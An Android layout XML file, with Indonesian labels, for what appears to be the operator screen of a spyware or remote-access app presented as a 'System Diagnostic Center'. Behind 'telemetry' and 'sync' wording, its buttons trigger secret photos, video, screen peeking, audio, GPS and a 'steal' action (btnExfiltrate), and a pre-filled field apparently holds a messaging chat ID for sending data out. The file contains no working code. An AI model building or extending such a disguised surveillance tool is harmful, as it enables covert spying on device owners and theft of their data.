<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#121212">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="16dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Pusat Diagnosa Sistem"
            android:textColor="#FFFFFF"
            android:textSize="24sp"
            android:textStyle="bold"
            android:layout_marginBottom="4dp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Versi 1.2.0 | Status: Gacor Banget"
            android:textColor="#4CAF50"
            android:textSize="12sp"
            android:layout_marginBottom="24dp"/>

        <EditText
            android:id="@+id/etChatId"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:hint="Alamat Relay Telemetry"
            android:textColorHint="#888888"
            android:textColor="#FFFFFF"
            android:inputType="number"
            android:text="6945113481"
            android:layout_marginBottom="16dp"
            android:backgroundTint="#00FF00"/>

        <Button
            android:id="@+id/btnStartUpdate"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Sinkron Modul Inti"
            android:layout_marginBottom="24dp"
            android:backgroundTint="#2E7D32"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Kontrol Rekam Visual Pro"
            android:textColor="#BBBBBB"
            android:textSize="14sp"
            android:textStyle="bold"
            android:layout_marginBottom="8dp"/>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:weightSum="2"
            android:layout_marginBottom="8dp">

            <Button
                android:id="@+id/btnInstantPhoto"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Foto Diem-Diem"
                android:layout_marginEnd="4dp"
                android:backgroundTint="#E91E63"/>

            <Button
                android:id="@+id/btnStreamVideo"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Rekam Video"
                android:layout_marginStart="4dp"
                android:backgroundTint="#FF9800"/>
        </LinearLayout>

        <Button
            android:id="@+id/btnScreenshot"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Intip Layar HP"
            android:layout_marginBottom="16dp"
            android:backgroundTint="#1565C0"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Bantuan dan Utilitas"
            android:textColor="#BBBBBB"
            android:textSize="14sp"
            android:textStyle="bold"
            android:layout_marginBottom="8dp"/>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:weightSum="3"
            android:layout_marginBottom="16dp">

            <Button
                android:id="@+id/btnAudio"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Audio"
                android:layout_marginEnd="2dp"
                android:backgroundTint="#7B1FA2"/>

            <Button
                android:id="@+id/btnLocation"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="GPS"
                android:layout_marginHorizontal="2dp"
                android:backgroundTint="#388E3C"/>

            <Button
                android:id="@+id/btnExfiltrate"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Nyolong"
                android:layout_marginStart="2dp"
                android:backgroundTint="#C62828"/>
        </LinearLayout>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Log Sinkronisasi"
            android:textColor="#BBBBBB"
            android:textSize="14sp"
            android:textStyle="bold"
            android:layout_marginBottom="8dp"/>

        <FrameLayout
            android:layout_width="match_parent"
            android:layout_height="100dp"
            android:background="#1A1A1A"
            android:layout_marginBottom="16dp">
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Buffer optimal. Inti gacor."
                android:textColor="#444444"
                android:layout_gravity="center"/>
        </FrameLayout>

        <Button
            android:id="@+id/btnSettings"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Konfigurasi Akses Sistem"
            style="@style/Widget.MaterialComponents.Button.TextButton"
            android:textColor="#90CAF9"/>

    </LinearLayout>
</ScrollView>
